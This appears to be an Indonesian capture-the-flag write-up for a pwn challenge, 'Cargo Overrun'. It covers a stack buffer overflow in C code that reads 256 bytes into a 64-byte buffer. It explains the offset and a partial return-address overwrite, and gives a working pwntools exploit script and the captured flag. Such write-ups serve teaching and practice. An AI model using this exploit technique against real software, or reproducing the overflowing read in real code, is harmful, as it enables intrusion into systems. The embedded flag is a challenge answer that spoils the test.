# Writeup — Cargo Overrun

## Deskripsi Challenge

Challenge ini berada pada kategori **pwn** dengan judul **Cargo Overrun**.

Kita diberikan source code berikut:

```c
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define BUFFER_SIZE 64
#define READ_SIZE 256

static void setup(void) {
    alarm(30);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void reveal_flag(void) {
    const char *flag = getenv("FLAG");

    if (flag == NULL) {
        flag = "uctf{dev-cargo-overrun}";
    }

    puts("Seal accepted. Updated manifest follows:");
    puts(flag);
}

static void handle_manifest(void) {
    char manifest[BUFFER_SIZE];

    puts("Dolos manifest relay");
    puts("Transmit the revised cargo manifest:");

    read(STDIN_FILENO, manifest, READ_SIZE);

    puts("Manifest queued for inspection.");
}

int main(void) {
    setup();
    handle_manifest();
    return 0;
}
```

Dari source code terlihat bahwa program memiliki fungsi `reveal_flag()`, tetapi fungsi tersebut tidak pernah dipanggil secara normal. Tujuan kita adalah mengalihkan alur eksekusi program ke fungsi `reveal_flag()`.

---

## Analisis Vulnerability

Bug utama terdapat pada fungsi `handle_manifest()`:

```c
char manifest[BUFFER_SIZE];
read(STDIN_FILENO, manifest, READ_SIZE);
```

Nilai `BUFFER_SIZE` adalah:

```c
#define BUFFER_SIZE 64
```

Namun program membaca input sebesar:

```c
#define READ_SIZE 256
```

Artinya, program menyediakan buffer sebesar **64 byte**, tetapi menerima input hingga **256 byte**.

Ini menyebabkan **stack buffer overflow**, sehingga kita bisa menimpa data setelah buffer, termasuk saved `RBP` dan saved return address `RIP`.

---

## Target Fungsi

Fungsi yang ingin kita tuju adalah:

```c
void reveal_flag(void)
```

Fungsi ini akan mengambil flag dari environment variable `FLAG`, lalu mencetaknya:

```c
puts("Seal accepted. Updated manifest follows:");
puts(flag);
```

Jadi challenge ini adalah tipe klasik:

```text
ret2win
```

Kita tidak perlu shell, tidak perlu ROP kompleks, dan tidak perlu leak libc. Cukup overwrite return address agar program lompat ke `reveal_flag()`.

---

## Menentukan Offset

Stack layout pada fungsi `handle_manifest()` secara sederhana:

```text
[ manifest buffer 64 byte ]
[ saved RBP 8 byte       ]
[ saved RIP 8 byte       ]
```

Maka offset dari awal buffer sampai saved return address adalah:

```text
64 + 8 = 72
```

Jadi payload dasar:

```python
payload = b"A" * 72
payload += alamat_reveal_flag
```

---

## Masalah Pada Percobaan Awal

Ketika binary dicompile lokal dengan perintah biasa:

```bash
gcc cargo_overrun.c -o cargo
```

program menghasilkan pesan:

```text
*** stack smashing detected ***: terminated
```

Ini terjadi karena compiler lokal mengaktifkan **stack canary** secara default. Stack canary mendeteksi overflow sebelum fungsi melakukan `ret`.

Namun pada service remote, payload tidak memunculkan pesan stack smashing. Artinya binary remote kemungkinan tidak memiliki canary, sesuai dengan hint challenge:

```text
One oversized update is enough to redirect execution straight past inspection.
```

---

## Full Address Tidak Berhasil

Percobaan awal menggunakan alamat lokal `reveal_flag()` tidak berhasil.

Script sempat memakai alamat seperti:

```text
0x401225
```

Namun hasilnya program hanya berhenti setelah:

```text
Manifest queued for inspection.
```

Artinya return address berhasil ditimpa, tetapi lompatannya tidak menuju fungsi `reveal_flag()` pada binary remote.

Hal ini terjadi karena layout binary lokal dan remote tidak sama. Alamat fungsi pada binary lokal tidak selalu identik dengan binary remote, terutama jika ada perbedaan kompilasi seperti PIE, base address, atau opsi compiler.

---

## Partial Overwrite

Karena return address awal masih berada di area binary yang sama, kita bisa memakai teknik **partial overwrite**.

Idenya adalah tidak menimpa seluruh alamat return address, tetapi hanya menimpa **2 byte terakhir** dari saved `RIP`.

Payload-nya:

```python
payload = b"A" * 72
payload += p16(target_low16)
```

Dengan cara ini, byte atas alamat return address tetap mengikuti alamat asli saat runtime, sedangkan byte bawahnya kita ubah agar mengarah ke fungsi target.

Pada percobaan pertama, payload dengan low 2 byte `0x1225` justru membuat program kembali ke `handle_manifest()`:

```text
Manifest queued for inspection.
Dolos manifest relay
Transmit the revised cargo manifest:
```

Ini membuktikan bahwa overwrite berhasil, tetapi target address-nya masih salah.

Kemudian dilakukan percobaan pada beberapa kandidat alamat rendah di sekitar area fungsi. Kandidat yang berhasil adalah:

```text
0x11d1
```

---

## Solver

Script exploit final:

```python
from pwn import *

HOST = "tcp-01kyy5f582twc2r5ewhpcy3m01.u-ctf-ctf-7001b39a.urc.tf"
PORT = 443

offset = 72

io = remote(HOST, PORT, ssl=True, sni=True)

payload = b"A" * offset
payload += p16(0x11d1)

io.recvuntil(b"Transmit the revised cargo manifest:")
io.send(payload)

print(io.recvall(timeout=2).decode(errors="ignore"))
```

---

## Output

Setelah script dijalankan:

```text
Manifest queued for inspection.
Seal accepted. Updated manifest follows:
uctf{fb88a5979b5e32d5116418b303c155c4a47e}
```

Program berhasil lompat ke `reveal_flag()` dan mencetak flag.

---

## Flag

```text
uctf{fb88a5979b5e32d5116418b303c155c4a47e}
```

---
